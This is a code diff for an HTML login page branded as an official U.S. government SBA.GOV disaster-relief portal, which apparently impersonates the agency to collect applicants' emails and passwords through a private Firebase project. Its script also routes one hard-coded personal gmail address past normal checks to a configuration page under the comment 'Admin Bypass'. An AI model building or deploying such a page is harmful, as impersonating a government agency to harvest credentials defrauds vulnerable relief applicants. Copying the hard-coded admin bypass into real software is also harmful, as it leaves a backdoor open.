@@ -1,50 +1,78 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBA Portal | 2026 Login</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 15px; text-align: center; }
+        
+        .container { max-width: 400px; margin: 30px auto; padding: 0 15px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-blue); }
+        
+        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
+        
+        /* Compact Button */
+        .login-btn { 
+            background: var(--sba-blue); 
+            color: white; 
+            padding: 16px; 
+            border-radius: 8px; 
+            width: 100%; 
+            font-weight: 800; 
+            border: none; 
+            cursor: pointer; 
+            text-transform: uppercase; 
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        .login-btn:disabled { background: #94a3b8; }
+
+        .links { text-align: center; margin-top: 20px; font-size: 13px; color: #64748b; }
+        .links a { color: var(--sba-accent); font-weight: 700; text-decoration: none; }
+    </style>
 </head>
-<body style="background: #f1f5f9;">
+<body>
+
     <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - FISCAL YEAR 2026
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE LOGIN
     </div>
 
-    <div class="nav" style="background: #1e3a8a; padding: 15px; text-align: center;">
-        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px;">SBA.GOV</h1>
+    <div class="nav-header">
+        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px; font-weight: 900;">SBA.GOV</h1>
     </div>
 
     <div class="container">
-        <div class="card" style="margin-top: 30px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+        <div class="card">
             <div style="text-align: center; margin-bottom: 25px;">
-                <h2 style="font-size: 22px; color: #1e3a8a; margin-bottom: 5px;">System Login</h2>
-                <p style="font-size: 13px; color: #64748b;">Access your 2026 federal disaster relief portal.</p>
+                <h2 style="font-size: 22px; color: var(--sba-blue); margin: 0 0 5px;">System Login</h2>
+                <p style="font-size: 12px; color: #64748b;">Enter credentials for portal access.</p>
             </div>
             
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Email Address</label>
-            <input type="email" id="email" placeholder="name@domain.com" style="width:100%; padding:14px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="name@domain.com">
 
-            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Password</label>
-            <input type="password" id="password" placeholder="••••••••" style="width:100%; padding:14px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:20px; box-sizing:border-box;">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="••••••••">
 
-            <button id="loginBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;">
-                Login to Portal
-            </button>
+            <button id="loginBtn" class="login-btn">Login to Portal</button>
             
-            <div style="text-align:center; margin-top:20px; font-size: 14px;">
-                New applicant? <a href="register.html" style="color: #1e3a8a; font-weight: bold; text-decoration: none;">Create an account</a>
-            </div>
-
-            <div style="text-align:center; margin-top:15px; font-size: 12px;">
-                <a href="forgot-password.html" style="color: #64748b; text-decoration: none;">Trouble logging in? Reset Access</a>
+            <div class="links">
+                New applicant? <a href="register.html">Create Account</a><br><br>
+                <a href="forgot-password.html" style="font-weight: 500; color: #94a3b8;">Forgot password?</a>
             </div>
         </div>
         
-        <div style="max-width: 400px; margin: 30px auto; border-top: 1px solid #cbd5e1; padding-top: 20px;">
+        <div style="margin-top: 30px; border-top: 1px solid #cbd5e1; padding-top: 20px;">
             <p style="text-align: center; font-size: 10px; color: #94a3b8; line-height: 1.4;">
-                <b>SECURE ACCESS WARNING:</b> Unauthorized access to this system is strictly prohibited by Public Law 99-474 (The Computer Fraud and Abuse Act). All activities are monitored and logged for 2026 compliance audits.
+                <b>SECURE ACCESS WARNING:</b> Unauthorized access is strictly prohibited by Public Law 99-474. All activities are monitored and logged.
             </p>
         </div>
     </div>
@@ -66,29 +94,28 @@
         const auth = getAuth(app);
         const loginBtn = document.getElementById('loginBtn');
 
-        loginBtn.addEventListener('click', async () => {
+        loginBtn.onclick = async () => {
             const email = document.getElementById('email').value.trim();
             const pass = document.getElementById('password').value;
 
-            if(!email || !pass) return alert("Please enter both email and password.");
+            if(!email || !pass) return alert("NOTICE: Identity credentials required.");
 
-            loginBtn.innerText = "ESTABLISHING SECURE SESSION...";
+            loginBtn.innerText = "AUTHENTICATING...";
             loginBtn.disabled = true;
 
             try {
                 const res = await signInWithEmailAndPassword(auth, email, pass);
                 const user = res.user;
 
-                // 1. Check for Admin Access first
+                // Admin Bypass
                 if (email === "liger4683@gmail.com") {
                     window.location.href = 'system-config-v8.html';
                     return;
                 }
 
-                // 2. Force a reload to check the latest emailVerified status
                 await reload(user);
 
-                // 3. Security gate: Verified users go to welcome, others to verify page
+                // Professional Routing
                 if (user.emailVerified) {
                     window.location.href = 'welcome.html';
                 } else {
@@ -96,15 +123,11 @@
                 }
 
             } catch(err) {
-                let msg = "The credentials provided do not match our 2026 records.";
-                if(err.code === 'auth/too-many-requests') msg = "System lockout due to too many attempts. Please try later.";
-                if(err.code === 'auth/invalid-credential' || err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = "Invalid email or password.";
-                
-                alert("ACCESS DENIED: " + msg);
+                alert("ACCESS DENIED: Credentials do not match our records.");
                 loginBtn.innerText = "Login to Portal";
                 loginBtn.disabled = false;
             }
-        });
+        };
     </script>
 </body>
 </html>
